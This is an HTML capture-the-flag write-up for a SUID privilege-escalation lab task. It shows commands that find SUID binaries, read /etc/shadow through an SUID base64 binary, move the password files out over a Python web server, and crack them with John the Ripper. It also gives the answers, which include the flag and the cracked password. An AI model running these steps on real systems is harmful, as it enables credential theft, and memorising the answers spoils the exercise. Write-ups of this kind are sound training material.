@@ -1,0 +1,16 @@
+<!doctype html><html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>Task 7 - SUID</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+  
+    <script type="text/javascript">
+        function in_frame () { try { return window.self !== window.top; } catch (e) { return true; } }
+        if (!in_frame()) {
+            var page = location.pathname.substring(location.pathname.lastIndexOf("/") + 1);
+            window.location = 'index.html#' + page;
+        }
+    </script>
+</head>
+<body><div class="page"><h1 class="title">Task 7 - SUID</h1><br/><strong>Which user shares the name of a great comic book writer?</strong><br /><br />    ‘cat /etc/passwd’<br />    <br />  <strong>  Answer: gerryconway</strong><br /><br /><br /><strong> What is the password of user2?</strong><br /> <br />    if we search for binaries whose SUID bit is set using:<br />        ‘<code>find / -type f -perm -04000 -ls 2&gt;/dev/null</code>’<br />        or<br />        ‘find / -perm -u=s -type f 2&gt;/dev/null’ which looks nicer<br />    we find the base64 binary. GTFObins (<a href="https://gtfobins.github.io/gtfobins/base64/#suid">https://gtfobins.github.io/gtfobins/base64/#suid</a>) says that files can be read with the following command:<br />        ‘base64 $file | base64 --decode’<br />        <br />    To reveal user2's password this was done with the /etc/shadow file. The output was piped to a file in the /tmp directoy. This is also where a copy of the /etc/passwd file was placed.<br />    <br />    Afterwards, since this machine has Python installed, a local webserver was started in the /tmp directoy:<br />        ‘python3 -m http.server 8080’<br />        <br />    Then the aforementioned files were downloaded onto the attack box using wget.<br />    <br />    On the attackbox the two files were first unshadowed:<br />        unshadow &lt;passwdfile&gt; &lt;shadowfile&gt; &gt; unshadow.txt<br />        <br />    and then cracked using John the Ripper:<br />        ‘john --wordlist=/usr/share/wordlists/rockyou.txt unshadow.txt’<br />        <br />    This then revealed user2's password to be ‘Password1’<br />    <br /> <strong>   Answer: Password1</strong><br /> <br />   <br /><strong> What is the content of the flag3.txt file?</strong><br /> <br />    'find / -name flag3.txt 2&gt;/dev/null'<br />    ‘base64 /home/ubuntu/flag3.txt | base64 --decode’<br />    <br /> <strong>   Answer: THM-3847834</strong></div></body></html>
